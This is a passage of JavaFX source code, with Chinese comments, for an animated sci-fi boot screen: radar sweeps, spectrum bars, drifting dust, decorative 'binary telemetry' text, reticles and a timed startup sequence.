            Region line = line(WIDTH, 1, 0, ys[i], i == 2);
            line.setScaleX(0);
            coordinateLayer.getChildren().add(line);
        }
    }

    private Region line(double w, double h, double x, double y, boolean strong) {
        Region r = new Region();
        r.getStyleClass().add(strong ? "coordinate-line-strong" : "coordinate-line");
        r.setMinSize(w, h);
        r.setPrefSize(w, h);
        r.setMaxSize(w, h);
        r.setLayoutX(x);
        r.setLayoutY(y);
        r.setOpacity(0);
        return r;
    }


    private void buildBinaryTelemetry() {
        // 权重：payload 38% / security 30% / binary 32%，总数保持克制但提高可读性。
        // 背景三类数据刷新略提速，保持黑客终端感，但不提高数量或透明度，避免抢主 HUD。
        for (int i = 0; i < 62; i++) {
            String[] seeds;
            double peakOpacity;
            double updateSeconds;
            double pick = random.nextDouble();
            if (pick < 0.38) {
                seeds = PAYLOAD_SEEDS;
                peakOpacity = 0.64;
                updateSeconds = 0.88 + random.nextDouble() * 0.55;
            } else if (pick < 0.68) {
                seeds = SECURITY_SEEDS;
                peakOpacity = 0.62;
                updateSeconds = 1.05 + random.nextDouble() * 0.70;
            } else {
                seeds = BINARY_SEEDS;
                peakOpacity = 0.58;
                updateSeconds = 0.76 + random.nextDouble() * 0.62;
            }
            Text t = new Text(randomBinaryText(seeds));
            t.getStyleClass().add("binary-flow");
            if (seeds == PAYLOAD_SEEDS) {
                t.getStyleClass().add("binary-flow-attack");
            } else if (seeds == SECURITY_SEEDS) {
                t.getStyleClass().add("binary-flow-security");
            } else if (random.nextBoolean()) {
                t.getStyleClass().add("binary-flow-red");
            } else {
                t.getStyleClass().add("binary-flow-blue");
            }
            double x = 36 + random.nextDouble() * 980;
            double y = 58 + random.nextDouble() * 604;
            if (isHudFocusZone(x, y)) {
                peakOpacity *= 0.24;
            } else if (isDeckFocusZone(x, y)) {
                peakOpacity *= 0.46;
                if (random.nextDouble() < 0.70) {
                    x = random.nextBoolean()
                            ? 42 + random.nextDouble() * 270
                            : 920 + random.nextDouble() * 250;
                }
            }
            t.setLayoutX(x);
            t.setLayoutY(y);
            t.setOpacity(0);
            t.setCache(true);
            t.setCacheHint(javafx.scene.CacheHint.SPEED);
            BinaryFlow flow = new BinaryFlow(t, seeds, -34 + random.nextDouble() * 68, -12 + random.nextDouble() * 24, peakOpacity, updateSeconds);
            binaryFlows.add(flow);
            binaryLayer.getChildren().add(t);
        }
    }

    private boolean isDeckFocusZone(double x, double y) {
        return x > 330 && x < 900 && y > 92 && y < 585;
    }

    private boolean isHudFocusZone(double x, double y) {
        return (x > -80 && x < 430 && y > 92 && y < 575)
                || (x > 820 && x < WIDTH + 80 && y > 92 && y < 660);
    }

    private String randomBinaryText(String[] seeds) {
        String seed = seeds[random.nextInt(seeds.length)];
        StringBuilder sb = new StringBuilder(seed);
        sb.append(seeds == PAYLOAD_SEEDS ? " :: " : " // ");
        int len = seeds == PAYLOAD_SEEDS ? 6 + random.nextInt(7) : 10 + random.nextInt(14);
        for (int i = 0; i < len; i++) {
            sb.append(random.nextBoolean() ? '1' : '0');
        }
        return sb.toString();
    }

    private void buildDualChannels() {
        Pane blue = channelPane(510, 34, 64, 154, -17, true);
        blue.setTranslateX(-120);
        blue.setTranslateY(-18);
        Pane red = channelPane(500, 30, 716, 518, -17, false);
        red.setTranslateX(120);
        red.setTranslateY(18);
        dualChannels.add(blue);
        dualChannels.add(red);
        dualChannelLayer.getChildren().addAll(blue, red);
    }

    private Pane channelPane(double width, double height, double x, double y, double rotate, boolean blue) {
        Pane p = new Pane();
        p.getStyleClass().add("dual-channel");
        p.setMinSize(width, height);
        p.setPrefSize(width, height);
        p.setMaxSize(width, height);
        p.setLayoutX(x);
        p.setLayoutY(y);
        p.setRotate(rotate);
        Region glow = new Region();
        glow.getStyleClass().add(blue ? "channel-glow-blue" : "channel-glow-red");
        glow.setMinSize(width, height);
        glow.setPrefSize(width, height);
        glow.setMaxSize(width, height);
        glow.setLayoutX(0);
        glow.setLayoutY(0);
        Region core = new Region();
        core.getStyleClass().add(blue ? "channel-core-blue" : "channel-core-red");
        core.setMinSize(width, 2);
        core.setPrefSize(width, 2);
        core.setMaxSize(width, 2);
        core.setLayoutX(0);
        core.setLayoutY(height / 2.0 - 1);
        p.getChildren().addAll(glow, core);
        p.setOpacity(0);
        return p;
    }

    private void buildConnections() {
        addAnchorLine(300, 278, 154, false);
        addAnchorLine(300, 430, 154, false);
        addAnchorLine(826, 278, 154, true);
        addAnchorLine(826, 430, 154, true);
        addAnchorDot(454, 278);
        addAnchorDot(454, 430);
        addAnchorDot(826, 278);
        addAnchorDot(826, 430);
        startAnchorBreath(1500);                       // 1500ms 后启动 anchor 呼吸，避与 phaseHud 首次 fadeTo 1.0 冲突
    }

    /**
     * anchor 锦点线呼吸：2400ms / 周期，opacity 0.55 ↔ 1.0，让 HUD 与玻璃台的连接关系"活"起来。
     * phaseHud 首次 fadeTo 1.0 结束后才启动，避免二者同时写 opacity 造成闪动。
     */
    /**
     * 启动终端心跳涟漪：2 个 Region 在位置由 1× 扩到 2.6×，opacity 0.62→0，
     * 1400ms / 周期，错峰 700ms，让底部 terminalDot 看起来一直"在跳"。
     * bottomRail 首次 fade-in 前涟漪也在跑，但 bottomRail.opacity=0，不可见也不影响首屏。
     */
    private void startTerminalRipple() {
        if (terminalRipple1 == null || terminalRipple2 == null) return;
        startRippleOn(terminalRipple1, 0);
        startRippleOn(terminalRipple2, 700);
    }

    private void startRippleOn(final Region ripple, double delayMs) {
        ripple.setScaleX(1.0);
        ripple.setScaleY(1.0);
        ripple.setOpacity(0);
        Timeline tl = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(ripple.scaleXProperty(), 1.0),
                        new KeyValue(ripple.scaleYProperty(), 1.0),
                        new KeyValue(ripple.opacityProperty(), 0.62)),
                new KeyFrame(Duration.millis(1400),
                        new KeyValue(ripple.scaleXProperty(), 2.6, Interpolator.EASE_OUT),
                        new KeyValue(ripple.scaleYProperty(), 2.6, Interpolator.EASE_OUT),
                        new KeyValue(ripple.opacityProperty(), 0, Interpolator.EASE_OUT))
        );
        tl.setCycleCount(Animation.INDEFINITE);
        tl.setDelay(Duration.millis(delayMs));
        tl.play();
        animations.add(tl);
    }

    private void startAnchorBreath(double startDelayMs) {
        delay(startDelayMs, new Runnable() {
            @Override public void run() {
                for (Node n : connectionLayer.getChildren()) {
                    if (!(n.getStyleClass().contains("anchor-line") || n.getStyleClass().contains("anchor-line-right"))) continue;
                    Timeline pulse = new Timeline(
                            new KeyFrame(Duration.millis(1200), new KeyValue(n.opacityProperty(), 0.55, Interpolator.EASE_BOTH)),
                            new KeyFrame(Duration.millis(2400), new KeyValue(n.opacityProperty(), 1.0, Interpolator.EASE_BOTH))
                    );
                    pulse.setCycleCount(Animation.INDEFINITE);
                    pulse.play();
                    animations.add(pulse);
                }
            }
        });
    }


    /**
     * 频谱柱状图 SPEC ANALYZER 初始化：
     *   - 16 个 8px 宽的 cyan 柱条，4px 间隔，总宽 8×16 + 4×15 = 188px
     *   - 初始高度 6→20px（底对齐），启动后由 animateSpectrum 驱动跳动
     *   - 底部 6 个频率刻度 label（0 / 1K / 4K / 16K / 64K / 256K）
     */
    private void buildSpectrum() {
        if (spectrumPane == null) return;
        int barCount = 16;
        double barWidth = 8;
        double barGap = 4;
        for (int i = 0; i < barCount; i++) {
            Region bar = new Region();
            bar.getStyleClass().add("spectrum-bar");
            bar.setMinWidth(barWidth);
            bar.setPrefWidth(barWidth);
            bar.setMaxWidth(barWidth);
            double startH = 6 + random.nextDouble() * 14;
            bar.setMinHeight(0);
            bar.setPrefHeight(startH);
            bar.setMaxHeight(Region.USE_PREF_SIZE);
            bar.setLayoutX(i * (barWidth + barGap));
            bar.setLayoutY(SPECTRUM_BAR_MAX - startH);
            bar.setCache(true);
            bar.setCacheHint(javafx.scene.CacheHint.SPEED);
            spectrumBars.add(bar);
            spectrumPane.getChildren().add(bar);
        }
        if (spectrumScale != null) {
            String[] scales = { "0", "1K", "4K", "16K", "64K", "256K" };
            for (String s : scales) {
                Label l = new Label(s);
                l.getStyleClass().add("spectrum-scale-label");
                l.setPrefWidth(210.0 / scales.length);
                // 静态刻度 label，开启位图缓存优化渲染
                l.setCache(true);
                l.setCacheHint(javafx.scene.CacheHint.SPEED);
                spectrumScale.getChildren().add(l);
            }
        }
    }

    /**
     * 频谱柱状图跳动 animator：
     *   - 每 220ms 给每个柱条抽一个新高度 target（6→72）
     *   - 用 160ms 的子 Timeline 做平滑过渡，避免旧版 110/180ms 重叠排队
     *   - target > 72% 时切到 .spectrum-bar-hot 加 cyan glow
     */
    private void activateSpectrum(double delayMs) {
        if (spectrumBars.isEmpty()) return;
        delay(delayMs, new Runnable() {
            @Override public void run() { animateSpectrum(); }
        });
    }

    private void animateSpectrum() {
        // 性能优化：合并 Timeline 的 KeyValue，减少高频对象创建，降低垃圾回收压力
        Timeline tick = new Timeline(new KeyFrame(Duration.millis(220), new javafx.event.EventHandler<javafx.event.ActionEvent>() {
            @Override public void handle(javafx.event.ActionEvent e) {
                Timeline batch = new Timeline();
                KeyFrame frame;
                List<KeyValue> values = new ArrayList<KeyValue>(spectrumBars.size() * 2);
                for (final Region bar : spectrumBars) {
                    final double target = 6 + random.nextDouble() * (SPECTRUM_BAR_MAX - 6);
                    boolean hot = target > SPECTRUM_BAR_MAX * 0.72;
                    if (hot) {
                        if (!bar.getStyleClass().contains("spectrum-bar-hot")) {
                            bar.getStyleClass().add("spectrum-bar-hot");
                        }
                    } else {
                        bar.getStyleClass().remove("spectrum-bar-hot");
                    }
                    values.add(new KeyValue(bar.prefHeightProperty(), target, Interpolator.EASE_OUT));
                    values.add(new KeyValue(bar.layoutYProperty(), SPECTRUM_BAR_MAX - target, Interpolator.EASE_OUT));
                }
                frame = new KeyFrame(Duration.millis(160), values.toArray(new KeyValue[0]));
                batch.getKeyFrames().add(frame);
                batch.play();
            }
        }));
        tick.setCycleCount(Animation.INDEFINITE);
        tick.play();
        animations.add(tick);
    }

    /**
     * 雷达 PPI 初始化：
     *   - radarPane 是 90×90 StackPane，所有 children 默认居中（pane 中心 = 45, 45）
     *   - 中心十字（横 60×1 + 竖 1×60，居中）
     *   - 同心圆 2 个（直径 30 + 直径 60，圆形描边由 .radar-ring border 提供）
     *   - 扫描臂 radarArmGroup（90×90 透明容器绕圆心转，arm 从圆心向外）
     *   - 3 个 target 光斑
     */
    private void buildRadar() {
        if (radarPane == null) return;
        // 中心十字
        Region crossH = new Region();
        crossH.getStyleClass().add("radar-cross");
        crossH.setMinSize(60, 1); crossH.setPrefSize(60, 1); crossH.setMaxSize(60, 1);
        Region crossV = new Region();
        crossV.getStyleClass().add("radar-cross");
        crossV.setMinSize(1, 60); crossV.setPrefSize(1, 60); crossV.setMaxSize(1, 60);
        radarPane.getChildren().addAll(crossH, crossV);
        // 同心圆 · 直径 30 / 60（外圆 r=45 由 .radar-pane border 提供）
        Region ring1 = new Region();
        ring1.getStyleClass().add("radar-ring");
        ring1.setMinSize(30, 30); ring1.setPrefSize(30, 30); ring1.setMaxSize(30, 30);
        Region ring2 = new Region();
        ring2.getStyleClass().add("radar-ring");
        ring2.setMinSize(60, 60); ring2.setPrefSize(60, 60); ring2.setMaxSize(60, 60);
        radarPane.getChildren().addAll(ring1, ring2);
        // 开启静态雷达元素的位图缓存以优化性能
        for (Region r : new Region[] { crossH, crossV, ring1, ring2 }) {
            r.setCache(true);
            r.setCacheHint(javafx.scene.CacheHint.SPEED);
        }
        // 扫描臂 · 透明容器绕 PPI 圆心旋转，避免 Region 自身中心点导致指针错位
        radarArmGroup = new Pane();
        radarArmGroup.setMinSize(90, 90);
        radarArmGroup.setPrefSize(90, 90);
        radarArmGroup.setMaxSize(90, 90);
        radarArmGroup.setCache(true);
        radarArmGroup.setCacheHint(javafx.scene.CacheHint.SPEED);
        radarArm = new Region();
        radarArm.getStyleClass().add("radar-arm");
        radarArm.setMinSize(42, 2); radarArm.setPrefSize(42, 2); radarArm.setMaxSize(42, 2);
        radarArm.setLayoutX(45);
        radarArm.setLayoutY(44);
        Region center = new Region();
        center.getStyleClass().add("radar-center-dot");
        center.setMinSize(5, 5); center.setPrefSize(5, 5); center.setMaxSize(5, 5);
        center.setLayoutX(42.5);
        center.setLayoutY(42.5);
        radarArmGroup.getChildren().addAll(radarArm, center);
        radarPane.getChildren().add(radarArmGroup);
        // 3 个 target 光斑
        for (int i = 0; i < 3; i++) {
            Region t = new Region();
            t.getStyleClass().add("radar-target");
            t.setMinSize(4, 4); t.setPrefSize(4, 4); t.setMaxSize(4, 4);
            t.setOpacity(0);
            radarTargets.add(t);
            radarPane.getChildren().add(t);
        }
    }

    /**
     * [R4 · 选项 A] 雷达 animator：
     *   - 扫描臂 4s 一圈匀速 360° 旋转（INDEFINITE）
     *   - AZIM/RNG 数值每 320ms 跟随扫描臂角度刷新一次（AZIM = arm 当前度数 mod 360 / RNG = 0.4~9.9km 随机）
     *   - 3 个 target 错峰（0/400/800ms）每 1200ms 重定位 + 一次 280→900ms 的明灭脉冲
     */
    private void activateRadar(double delayMs) {
        if (radarArmGroup == null) return;
        delay(delayMs, new Runnable() {
            @Override public void run() { animateRadar(); }
        });
    }

    private void animateRadar() {
        Timeline rotateArm = new Timeline(
                new KeyFrame(Duration.ZERO, new KeyValue(radarArmGroup.rotateProperty(), 0)),
                new KeyFrame(Duration.millis(4000), new KeyValue(radarArmGroup.rotateProperty(), 360, Interpolator.LINEAR))
        );
        rotateArm.setCycleCount(Animation.INDEFINITE);
        rotateArm.play();
        animations.add(rotateArm);

        Timeline azimTick = new Timeline(new KeyFrame(Duration.millis(320), new javafx.event.EventHandler<javafx.event.ActionEvent>() {
            @Override public void handle(javafx.event.ActionEvent e) {
                int azim = ((int) radarArmGroup.getRotate()) % 360;
                if (azim < 0) azim += 360;
                if (radarAzimValue != null) radarAzimValue.setText(String.format("%03d\u00b0", azim));
                if (radarRngValue != null) radarRngValue.setText(String.format("%.1fkm", 0.4 + random.nextDouble() * 9.5));
            }
        }));
        azimTick.setCycleCount(Animation.INDEFINITE);
        azimTick.play();
        animations.add(azimTick);

        for (int i = 0; i < radarTargets.size(); i++) {
            final Region t = radarTargets.get(i);
            double phaseDelay = i * 400;
            Timeline blink = new Timeline(new KeyFrame(Duration.millis(1200), new javafx.event.EventHandler<javafx.event.ActionEvent>() {
                @Override public void handle(javafx.event.ActionEvent e) {
                    double angle = random.nextDouble() * 360;
                    double radius = 12 + random.nextDouble() * 16;
                    t.setTranslateX(radius * Math.cos(Math.toRadians(angle)));
                    t.setTranslateY(radius * Math.sin(Math.toRadians(angle)));
                    Timeline pulse = new Timeline(
                            new KeyFrame(Duration.millis(280), new KeyValue(t.opacityProperty(), 1.0)),
                            new KeyFrame(Duration.millis(900), new KeyValue(t.opacityProperty(), 0))
                    );
                    pulse.play();
                }
            }));
            blink.setCycleCount(Animation.INDEFINITE);
            blink.setDelay(Duration.millis(phaseDelay));
            blink.play();
            animations.add(blink);
        }
    }

    private void buildGlobalScanner() {
        Pane scan = new Pane();
        scan.setMinSize(WIDTH, 74);
        scan.setPrefSize(WIDTH, 74);
        scan.setMaxSize(WIDTH, 74);
        scan.setLayoutX(0);
        scan.setLayoutY(-90);
        scan.setOpacity(0);

        Region bloom = new Region();
        bloom.getStyleClass().add("global-scan-band");
        bloom.setMinSize(WIDTH, 74);
        bloom.setPrefSize(WIDTH, 74);
        bloom.setMaxSize(WIDTH, 74);
        bloom.setLayoutX(0);
        bloom.setLayoutY(0);

        Region core = new Region();
        core.getStyleClass().add("global-scan-core");
        core.setMinSize(WIDTH, 2);
        core.setPrefSize(WIDTH, 2);
        core.setMaxSize(WIDTH, 2);
        core.setLayoutX(0);
        core.setLayoutY(36);

        scan.getChildren().addAll(bloom, core);
        scan.setCache(true);
        scan.setCacheHint(javafx.scene.CacheHint.SPEED);
        bloom.setCache(true);
        bloom.setCacheHint(javafx.scene.CacheHint.SPEED);
        core.setCache(true);
        core.setCacheHint(javafx.scene.CacheHint.SPEED);
        globalScanBands.add(scan);
        globalScanLayer.getChildren().add(scan);
    }

    private void addAnchorLine(double x, double y, double w, boolean right) {
        Region r = new Region();
        r.getStyleClass().add(right ? "anchor-line-right" : "anchor-line");
        r.setMinSize(w, 1);
        r.setPrefSize(w, 1);
        r.setMaxSize(w, 1);
        r.setLayoutX(x);
        r.setLayoutY(y);
        r.setScaleX(0);
        r.setOpacity(0);
        connectionLayer.getChildren().add(r);
    }

    private void addAnchorDot(double x, double y) {
        Region r = new Region();
        r.getStyleClass().add("anchor-dot");
        r.setMinSize(4, 4);
        r.setPrefSize(4, 4);
        r.setMaxSize(4, 4);
        r.setLayoutX(x - 2);
        r.setLayoutY(y - 2);
        r.setOpacity(0);
        connectionLayer.getChildren().add(r);
    }

    private void buildDust() {
        for (int i = 0; i < 32; i++) {
            double size = 1.0 + random.nextDouble() * 2.0;
            Region dot = new Region();
            dot.getStyleClass().add("dust-dot");
            dot.setMinSize(size, size);
            dot.setPrefSize(size, size);
            dot.setMaxSize(size, size);
            Dust dust = new Dust(dot);
            dust.x = random.nextDouble() * WIDTH;
            dust.y = random.nextDouble() * HEIGHT;
            dust.vx = (random.nextDouble() - 0.5) * 6;
            dust.vy = -3 - random.nextDouble() * 8;
            dust.phase = random.nextDouble() * Math.PI * 2;
            dust.opacity = 0.12 + random.nextDouble() * 0.32;
            dot.setLayoutX(0);
            dot.setLayoutY(0);
            dot.setTranslateX(dust.x);
            dot.setTranslateY(dust.y);
            dot.setOpacity(dust.opacity);
            dot.setCache(true);
            dot.setCacheHint(javafx.scene.CacheHint.SPEED);
            dusts.add(dust);
            dustLayer.getChildren().add(dot);
        }
        dustTimer = new AnimationTimer() {
            private long last;
            @Override
            public void handle(long now) {
                if (last == 0) {
                    last = now;
                    return;
                }
                if (now - last < 33_000_000L) return;
                double dt = (now - last) / 1000000000.0;
                last = now;
                if (dt > 0.1) dt = 0.1;
                for (Dust d : dusts) {
                    d.phase += dt * 0.9;
                    d.x += (d.vx + Math.sin(d.phase) * 5) * dt;
                    d.y += d.vy * dt;
                    if (d.y < -8) {
                        d.y = HEIGHT + 8;
                        d.x = random.nextDouble() * WIDTH;
                    }
                    if (d.x < -8) d.x = WIDTH + 8;
                    if (d.x > WIDTH + 8) d.x = -8;
                    d.node.setTranslateX(d.x);
                    d.node.setTranslateY(d.y);
                    d.node.setOpacity(d.opacity * (0.65 + 0.35 * Math.sin(d.phase * 1.7)));
                }
            }
        };
        dustTimer.start();
    }

    private void buildGlassTexture() {
        for (int i = 0; i < 12; i++) {
            Region r = new Region();
            r.getStyleClass().add("texture-line");
            double w = 90 + random.nextDouble() * 230;
            r.setMinSize(w, 1);
            r.setPrefSize(w, 1);
            r.setMaxSize(w, 1);
            r.setLayoutX(76 + random.nextDouble() * 300);
            r.setLayoutY(70 + random.nextDouble() * 280);
            r.setOpacity(0.25 + random.nextDouble() * 0.45);
            r.setCache(true);
            r.setCacheHint(javafx.scene.CacheHint.SPEED);
            glassTextureLayer.getChildren().add(r);
        }
    }

    /**
     * [方案2 · 科技感升级] HUD 拐角十字瞘准星。
     * 单层结构：
     *   - leftWing青 / rightWing紫 两个翼面外框架
     *   - 中央 glassDeck 自带边缘高光与玻璃边框，不再加 L 角，避免与两翼 L 视觉叠加
     *   - 翼内 sub-block 不再绘制 L 角，避免与 block 背板、总外框叠成"框中框"
     * boundsInParent listener 自适应布局变化，零硬编码坐标。
     */
    private void buildCornerReticles() {
        if (cornerReticleLayer == null) return;
        attachReticleCorners(leftWing, 5, true, false);
        attachReticleCorners(rightWing, 5, false, false);
    }

    private void attachReticleCorners(final javafx.scene.Node target, final double extend, boolean cyan, boolean inner) {
        if (target == null || cornerReticleLayer == null) return;
        final double arm = inner ? 7 : 11;
        final double thick = 1;
        final String hClass;
        final String vClass;
        if (inner) {
            hClass = cyan ? "corner-reticle-inner-h" : "corner-reticle-inner-violet-h";
            vClass = cyan ? "corner-reticle-inner-v" : "corner-reticle-inner-violet-v";
        } else {
            hClass = cyan ? "corner-reticle-h" : "corner-reticle-violet-h";
            vClass = cyan ? "corner-reticle-v" : "corner-reticle-violet-v";
        }
        final Region[] parts = new Region[8]; // 4 角 × (H + V)
        for (int i = 0; i < 4; i++) {
            Region h = new Region();
            h.getStyleClass().add(hClass);
            h.setMinSize(arm, thick); h.setPrefSize(arm, thick); h.setMaxSize(arm, thick);
            Region v = new Region();
            v.getStyleClass().add(vClass);
            v.setMinSize(thick, arm); v.setPrefSize(thick, arm); v.setMaxSize(thick, arm);
            parts[i * 2] = h;
            parts[i * 2 + 1] = v;
            cornerReticleLayer.getChildren().addAll(h, v);
        }
        final Runnable reposition = new Runnable() {
            @Override public void run() {
                try {
                    javafx.geometry.Bounds bSc = target.localToScene(target.getBoundsInLocal());
                    javafx.geometry.Bounds b = cornerReticleLayer.sceneToLocal(bSc);
                    double x0 = b.getMinX(), y0 = b.getMinY();
                    double x1 = b.getMaxX(), y1 = b.getMaxY();
                    // TL
                    parts[0].relocate(x0 - extend, y0 - extend);
                    parts[1].relocate(x0 - extend, y0 - extend);
                    // TR
                    parts[2].relocate(x1 + extend - arm, y0 - extend);
                    parts[3].relocate(x1 + extend - thick, y0 - extend);
                    // BL
                    parts[4].relocate(x0 - extend, y1 + extend - thick);
                    parts[5].relocate(x0 - extend, y1 + extend - arm);
                    // BR
                    parts[6].relocate(x1 + extend - arm, y1 + extend - thick);
                    parts[7].relocate(x1 + extend - thick, y1 + extend - arm);
                } catch (Exception ignored) {}
            }
        };
        target.boundsInParentProperty().addListener(new javafx.beans.value.ChangeListener<javafx.geometry.Bounds>() {
            @Override public void changed(javafx.beans.value.ObservableValue<? extends javafx.geometry.Bounds> obs,
                                          javafx.geometry.Bounds o, javafx.geometry.Bounds n) {
                Platform.runLater(reposition);
            }
        });
        Platform.runLater(reposition);
        // 性能优化：开启位图缓存，避免每帧高成本地重新应用 dropshadow
        for (Region r : parts) {
            r.setCache(true);
            r.setCacheHint(javafx.scene.CacheHint.SPEED);
        }
    }

    private void buildGlassProbe() {
        if (glassProbeLayer == null) return;
        glassProbeLayer.setMinSize(520, 430);
        glassProbeLayer.setPrefSize(520, 430);
        glassProbeLayer.setMaxSize(520, 430);

        Region h = new Region();
        h.getStyleClass().add("glass-probe-line");
        h.setMinSize(138, 1);
        h.setPrefSize(138, 1);
        h.setMaxSize(138, 1);
        h.setLayoutX(191);
        h.setLayoutY(214);

        Region v = new Region();
        v.getStyleClass().add("glass-probe-line");
        v.setMinSize(1, 96);
        v.setPrefSize(1, 96);
        v.setMaxSize(1, 96);
        v.setLayoutX(260);
        v.setLayoutY(166);

        Region dot = new Region();
        dot.getStyleClass().add("glass-probe-dot");
        dot.setMinSize(6, 6);
        dot.setPrefSize(6, 6);
        dot.setMaxSize(6, 6);
        dot.setLayoutX(257);
        dot.setLayoutY(211);

        Region scan = new Region();
        scan.getStyleClass().add("glass-probe-scan");
        scan.setMinSize(190, 1);
        scan.setPrefSize(190, 1);
        scan.setMaxSize(190, 1);
        scan.setLayoutX(165);
        scan.setLayoutY(230);

        glassProbeLayer.getChildren().addAll(h, v, dot, scan);
    }

    private void buildModules() {
        for (int i = 0; i < moduleNames.length; i++) {
            HBox row = new HBox(7);
            row.setAlignment(Pos.CENTER_LEFT);
            row.getStyleClass().add("module-row");
            Label index = new Label(String.format("[%02d]", i + 1));
            index.getStyleClass().add("module-index");
            Label name = new Label(moduleNames[i]);
            name.getStyleClass().add("module-name");
            StackPane track = new StackPane();
            track.getStyleClass().add("module-bar-track");
            Region fill = new Region();
            fill.getStyleClass().add("module-bar-fill");
            setRegionWidth(fill, 0);
            StackPane.setAlignment(fill, Pos.CENTER_LEFT);
            track.getChildren().add(fill);
            Label state = new Label("WAIT");
            state.getStyleClass().add("module-state");
            row.getChildren().addAll(index, name, track, state);
            row.setOpacity(0);
            row.setTranslateX(-12);
            moduleList.getChildren().add(row);
            moduleRows.add(new ModuleRow(row, fill, state, 35 + random.nextDouble() * 31));
        }
    }

    private void buildTelemetry() {
        int rows = 5;
        int cols = 9;
        double gap = 8;
        double cell = 8;
        for (int y = 0; y < rows; y++) {
            for (int x = 0; x < cols; x++) {
                Region c = new Region();
                c.getStyleClass().add("matrix-cell");
                c.setMinSize(cell, cell);
                c.setPrefSize(cell, cell);
                c.setMaxSize(cell, cell);
                c.setLayoutX(x * (cell + gap));
                c.setLayoutY(y * (cell + gap));
                c.setOpacity(0.18);
                c.setCache(true);
                c.setCacheHint(javafx.scene.CacheHint.SPEED);
                matrixCells.add(c);
                telemetryMatrix.getChildren().add(c);
            }
        }
        for (int i = 0; i < telemetryNames.length; i++) {
            HBox row = new HBox(10);
            row.setAlignment(Pos.CENTER_LEFT);
            row.getStyleClass().add("telemetry-row");
            Label name = new Label(telemetryNames[i]);
            name.getStyleClass().add("telemetry-name");
            Label value = new Label("--");
            value.getStyleClass().add("telemetry-value");
            row.getChildren().addAll(name, value);
            row.setOpacity(0);
            row.setTranslateX(12);
            telemetryList.getChildren().add(row);
            telemetryValueLabels.add(value);
        }
    }

    private void buildPhaseTrack() {
        for (int i = 0; i < phaseNames.length; i++) {
            if (i > 0) {
                Region link = new Region();
                link.getStyleClass().add("phase-link");
                phaseTrack.getChildren().add(link);
                phaseItems.get(i - 1).nextLink = link;
            }
            VBox box = new VBox(5);
            box.setAlignment(Pos.CENTER);
            Region node = new Region();
            node.getStyleClass().add("phase-node");
            Label label = new Label(phaseNames[i]);
            label.getStyleClass().add("phase-label");
            box.getChildren().addAll(node, label);
            box.setOpacity(0);
            phaseTrack.getChildren().add(box);
            phaseItems.add(new PhaseItem(box, node, label));
        }
    }

    private void startClock() {
        clockTimer = new AnimationTimer() {
            private long lastSecond = -1;
            @Override
            public void handle(long now) {
                long second = now / 1000000000L;
                if (second != lastSecond) {
                    lastSecond = second;
                    topTimeLabel.setText(LocalDateTime.now().format(CLOCK_FORMAT));
                }
            }
        };
        clockTimer.start();
    }

    private void startPerfLogIfEnabled() {
        if (!LOAD_PERF_LOG_ENABLED || perfLogTimer != null) return;
        perfLogTimer = new AnimationTimer() {
            private long startNanos = -1;
            private long lastNanos = -1;
            private long frameCount = 0;
            private long slowFrameCount = 0;
            private long maxDeltaMs = 0;

            @Override
            public void handle(long now) {
                if (startNanos < 0) {
                    startNanos = now;
                    lastNanos = now;
                    return;
                }
                long deltaMs = (now - lastNanos) / 1_000_000L;
                long elapsedMs = (now - startNanos) / 1_000_000L;
                lastNanos = now;
                frameCount++;
                if (deltaMs > maxDeltaMs) maxDeltaMs = deltaMs;
                if (deltaMs >= LOAD_PERF_SLOW_FRAME_MS) {
                    slowFrameCount++;
                    System.out.println("[LoadPerf] slow frame +" + elapsedMs + "ms delta=" + deltaMs + "ms");
                }
                if (elapsedMs >= TOTAL_MS + 700) {
                    System.out.println("[LoadPerf] summary frames=" + frameCount
                            + " slow>=" + LOAD_PERF_SLOW_FRAME_MS + "ms=" + slowFrameCount
                            + " maxDeltaMs=" + maxDeltaMs
                            + " elapsedMs=" + elapsedMs);
                    stop();
                    perfLogTimer = null;
                }
            }
        };
        perfLogTimer.start();
    }

    private void runSequence() {
        // 首屏感知速度：0~250ms 内的"屏幕预热"，让用户迅速感知到系统响应，
        // 避免原本纯黑场的"卡住了"错觉。phaseWake 仍在 +250ms 从当前 ambient opacity 接管。
        phasePrewake();
        // 只有开启主开关时才启动帧率监测器
        if (AUTO_DEGRADATION_ENABLED) {
            startPerfMonitor();
        }
        // 极简模式：跳过 HUD/GLASS 子动画，只保留品牌核心，~2.2s 完成
        if ("minimal".equals(bootMode)) {
            runMinimalSequence();
            return;
        }
        delay(250, new Runnable() {
            @Override public void run() { phaseWake(); }
        });
        delay(1050, new Runnable() {
            @Override public void run() { phaseHud(); }
        });
        delay(1750, new Runnable() {
            @Override public void run() { phaseGlass(); }
        });
        delay(2650, new Runnable() {
            @Override public void run() { phaseLogo(); }
        });
        delay(3300, new Runnable() {
            @Override public void run() { phaseTitleAndTrack(); }
        });
        delay(4450, new Runnable() {
            @Override public void run() { phaseReady(); }
        });
        delay(TOTAL_MS, new Runnable() {
            @Override public void run() { markLoadingComplete(); }
        });
    }

    /**
     * 极简模式：~2.2s 启动序列：跳过 HUD 翼 / 阶段轨 / 模块自检 / 玻璃高光扫描，
     * 只保留：ambient 醒来 → 玻璃浮现 → Logo 直出 → 标题对齐 → READY 闪光。
     */
    private void runMinimalSequence() {
        // +200ms: ambient + dust + binary 快速淡入
        delay(200, new Runnable() {
            @Override public void run() {
                fadeTo(ambientLayer, 360, 1.0);
                fadeTo(dustLayer, 420, 0.6);
                fadeTo(binaryLayer, 420, 0.25);             // minimal 背景压低
                fadeTo(coordinateLayer, 360, 0.5);          // 经纬结构微调
                tintAmbient(0.85, 0.45, 0.10, 320);
            }
        });
        // +500ms: 玻璃直出（无 scale 弹回 / 无边光带 / 无高光扫过）
        delay(500, new Runnable() {
            @Override public void run() {
                glassDeck.setScaleX(1.0);
                glassDeck.setScaleY(1.0);
                fadeTo(glassDeck, 320, 1.0);
                fadeTo(glassBack, 320, 1.0);
                fadeTo(glassMist, 360, 0.7);
                fadeTo(glassSpectrum, 360, 0.65);
                tintAmbient(0.92, 0.55, 0.10, 360);
            }
        });
        // +780ms: Logo 直出（无圆环扫描，clip 直接展开）
        delay(780, new Runnable() {
            @Override public void run() {
                fadeTo(logoArea, 280, 1.0);
                logoImage.setOpacity(1);
                logoClip.setHeight(126);
                pop(logoLens, 380);
                pop(logoReticleOuter, 380);
                pop(logoReticleInner, 380);
                startLogoBreath();
                tintAmbient(0.80, 0.50, 0.55, 320);
            }
        });
        // +1100ms: 标题对齐（无影子分层 / 无逐字弹跳）
        delay(1100, new Runnable() {
